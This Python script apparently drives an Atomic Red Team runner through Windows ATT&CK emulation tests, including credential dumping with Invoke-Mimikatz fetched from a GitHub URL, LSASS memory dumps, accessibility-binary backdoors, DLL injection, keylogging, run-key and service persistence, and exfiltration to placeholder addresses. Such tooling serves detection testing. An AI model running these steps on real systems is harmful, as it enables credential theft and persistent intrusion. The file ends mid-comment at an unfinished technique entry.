# Imports runner.py, sets variables and executes scripts

import runner

def main():

    # Instantiate the AtomicRunner class instance.
    techniques = runner.AtomicRunner()

    # T1003 - Credential Dumping
    techniques.execute("T1003", position=0, parameters={'remote_script': 'https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1'})
    techniques.execute("T1003", position=1, parameters={})
    techniques.execute("T1003", position=2, parameters={'output_file': 'C:\\atomic_red_team_results\\t1003-p2-output.txt'})
    techniques.execute("T1003", position=3, parameters={})
    techniques.execute("T1003", position=4, parameters={'output_file': 'C:\\atomic_red_team_results\\t1003-p4-lsass_dump.dmp'})
    techniques.execute("T1003", position=5, parameters={'output_folder': 'C:\\atomic_red_team_results\\t1003-p5-dump'})

    # T1004 - Winlogon Helper DLL
    techniques.execute("T1004", position=0, parameters={'binary_to_execute': 'C:\\Windows\\System32\\cmd.exe'})
    techniques.execute("T1004", position=1, parameters={'binary_to_execute': 'C:\\Windows\\System32\\cmd.exe'})
    techniques.execute("T1004", position=2, parameters={'binary_to_execute': 'C\\Windows\\Temp\\atomicNotificationPackage.dll'})

    # T1005 - Data from Local System
    #techniques.execute("T1005", position=0, parameters={})  #Linux/Mac technique

    # T1007 - System Service Discovery
    techniques.execute("T1007", position=0, parameters={'service_name': 'svchost.exe'})
    techniques.execute("T1007", position=1, parameters={'output_file': 'C:\\atomic_red_team_results\\t1007-p1-output.txt'})

    # T1009 - Binary Padding
    #techniques.execute("T1009", position=0, parameters={})  #Linux/Mac technique

    # T1010 - Application Window Discovery
    techniques.execute("T1010", position=0, parameters={'inpute_source_code': "C:\\AtomicRedTeam\\atomics\T1010\src\T1010.cs", 'output_file_name': 'C:\\atomic_red_team_results\\T1010.exe'})

    # T1012 - Query Registry
    techniques.execute("T1012", position=0, parameters={})

    # T1014 - Loadable Kernel Module Based Rootkit
    techniques.execute("T1014", position=0, parameters={'driver_path': 'C:\\Drivers\\driver.sys'})

    # T1015 - Accessibility Features
    techniques.execute("T1015", position=0, parameters={'target_executable': 'osk.exe'})
    techniques.execute("T1015", position=1, parameters={'target_executable': 'sethc.exe'})
    techniques.execute("T1015", position=2, parameters={'target_executable': 'utilman.exe'})
    techniques.execute("T1015", position=3, parameters={'target_executable': 'magnify.exe'})
    techniques.execute("T1015", position=4, parameters={'target_executable': 'narrator.exe'})
    techniques.execute("T1015", position=5, parameters={'target_executable': 'DisplaySwitch.exe'})
    techniques.execute("T1015", position=6, parameters={'target_executable': 'atbroker.exe'})

    # T1016 - System Network Configuration Discovery
    techniques.execute("T1016", position=0, parameters={})

    # T1018 - Remote System Discovery
    techniques.execute("T1018", position=0, parameters={})
    techniques.execute("T1018", position=1, parameters={})
    techniques.execute("T1018", position=2, parameters={})

    # T1022 - Data Encrypted
    techniques.execute("T1022", position=0, parameters={})
    techniques.execute("T1022", position=1, parameters={})
    techniques.execute("T1022", position=2, parameters={})

    # T1027 - Obfuscated Files or Information
    #techniques.execute("T1027", position=0, parameters={})  #Linux/Mac technique

    # T1028 - Windows Remote Management
    # Commenting out tests 2-5, as they are intended to be executed on a remote machine
    # If running tests 2-5, fill in appropriate target, username and password
    techniques.execute("T1028", position=0, parameters={})
    #techniques.execute("T1028", position=1, parameters={'computer_name': 'REPLACE-ME'})
    #techniques.execute("T1028", position=2, parameters={'user_name': 'REPLACE-ME', 'password': 'REPLACE-ME', 'computer_name': 'REPLACE-ME'})
    #techniques.execute("T1028", position=3, parameters={'user_name': 'REPLACE-ME', 'password': 'REPLACE-ME', 'computer_name': 'REPLACE-ME'})
    #techniques.execute("T1028", position=4, parameters={'host_name': 'REPLACE-ME', 'remote_command': 'ipconfig'})

    # T1030 - Data Transfer Size Limits
    #techniques.execute("T1030", position=0, parameters={})  #Linux/Mac technique

    # T1031- Modify Existing Service
    techniques.execute("T1031", position=0, parameters={})

    # T1033 - System Owner/User Discovery
    # Commenting out test, as is it intended to be executed on a remote machine
    # If running test, fill in appropriate target
    #techniques.execute("T1033", position=0, parameters={'computer_name': 'REPLACE-ME'})

    # T1035 - Service Execution
    techniques.execute("T1035", position=0, parameters={'service_name': 'ARTService', 'executable_command': '%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType file C:\x07rt-marker.txt'})

    # T1036 - Masquerading
    techniques.execute("T1036", position=0, parameters={})

    # T1037 - Logon Scripts
    techniques.execute("T1037", position=0, parameters={'script_command': 'cmd.exe /c calc.exe'})

    # T1040 - Network Sniffing
    # Commenting out these tests, as they require Wireshark, WinPCAP and windump
    # If running these tests, specify the interface to attach to
    #techniques.execute("T1040", position=0, parameters={'interface': 'REPLACE-ME'})
    #techniques.execute("T1040", position=1, parameters={'interface': 'REPLACE-ME'})

    # T1042 - Change Default File Association
    techniques.execute("T1042", position=0, parameters={'extension_to_change': '.wav', 'target_extension_handler': 'C:\\Program Files\\Windows Media Player\\wmplayer.exe'})

    # T1046 - Network Service Scanning
    #techniques.execute("T1046", position=0, parameters={})  #Linux/Mac technique

    # T1047 - Windows Management Instrumentation
    # Commenting out test 4, as it is intended to be executed on a remote machine
    # If running test 4, fill in appropriate target
    techniques.execute("T1047", position=0, parameters={})
    techniques.execute("T1047", position=1, parameters={})
    techniques.execute("T1047", position=2, parameters={})
    #techniques.execute("T1047", position=3, parameters={"node": 'REPLACE-ME (IP ADDRESS)', 'service_search_string': 'sql server'})

    # T1048 - Exfiltration Over Alternative Protocol
    # Commenting out test, as it requires a destination address to exfil to
    # If running test, fill in path to .txt file and remote exfil IP address
    techniques.execute("T1048", position=0, parameters={'input_file': 'C:\\REPLACE-ME', 'ip_address': 'REPLACE-ME'})

    # T1049 - System Network Connections Discovery
    techniques.execute("T1049", position=0, parameters={})
    techniques.execute("T1049", position=1, parameters={})

    # T1050 - Service Installation
    techniques.execute("T1050", position=0, parameters={'binary_path': 'C:\\AtomicRedTeam\\atomics\\T1050\\bin\\AtomicService.exe', 'service_name': 'AtomicTestService'})
    techniques.execute("T1050", position=1, parameters={'binary_path': 'C:\\AtomicRedTeam\\atomics\\T1050\\bin\\AtomicService.exe', 'service_name': 'AtomicTestService'})

    # T1053 - Scheduled Task
    # Commenting out test 3, as it is intended to be executed on a remote machine
    # If running test 3, fill out appropriate target, username and password
    techniques.execute("T1053", position=0, parameters={})
    techniques.execute("T1053", position=1, parameters={'task_command': 'C:\\Windows\\system32\\cmd.exe', 'time': '1210'})
    #techniques.execute("T1053", position=2, parameters={'task_command': 'C:\\Windows\\system32\\cmd.exe', 'time': '1210', 'target': 'REPLACE-ME', 'user_name': 'REPLACE-ME', 'password': 'REPLACE-ME'})

    # T1055 - Process Injection
    techniques.execute("T1055", position=0, parameters={'dll_payload': 'C:\\AtomicRedTeam\\atomics\\T1055\\src\\x64\\T1055.dll', 'process_id': '$pid'})
    techniques.execute("T1055", position=1, parameters={'dll_payload': 'C:\\AtomicRedTeam\\atomics\\T1055\\src\\x64\\T1055.dll', 'process_id': '$pid'})
    techniques.execute("T1055", position=2, parameters={'exe_binary': 'C:\\AtomicRedTeam\\atomics\\T1055\\src\\x64\\T1055.dll',})

    # T1056 - Input Capture
    techniques.execute("T1056", position=0, parameters={'filepath': 'C:\\atomic_red_team_results\\t1056-key.log'})

    # T1057 - Process Discovery
    #techniques.execute("T1057", position=0, parameters={})  #Linux/Mac technique

    # T1059 - Command-Line Interface
    #techniques.execute("T1059", position=0, parameters={})  #Linux/Mac technique

    # T1060 - Registry Run Keys / Start Folder
    techniques.execute("T1060", position=0, parameters={'command_to_execute': 'C:\\Path\\AtomicRedTeam.exe'})
    techniques.execute("T1060", position=1, parameters={'thing_to_execute': 'C:\\Path\\AtomicRedTeam.dll'})
    techniques.execute("T1060", position=2, parameters={'thing_to_execute': 'powershell.exe'})
    techniques.execute("T1060", position=3, parameters={'thing_to_execute': 'C:\\Path\\AtomicRedTeam.exe'})

    # T1062 - Hypervisor
    # Commenting out test, as it requires a hostname
    # If running test, fill out hostname field
    #techniques.execute("T1062", position=0, parameters={'hostname': 'REPLACE-ME', 'vm_name': 'testvm', 'file_location': 'C:\\Temp\\test.vhdx'})

    # T1063 -





if __name__ == "__main__":
    main()

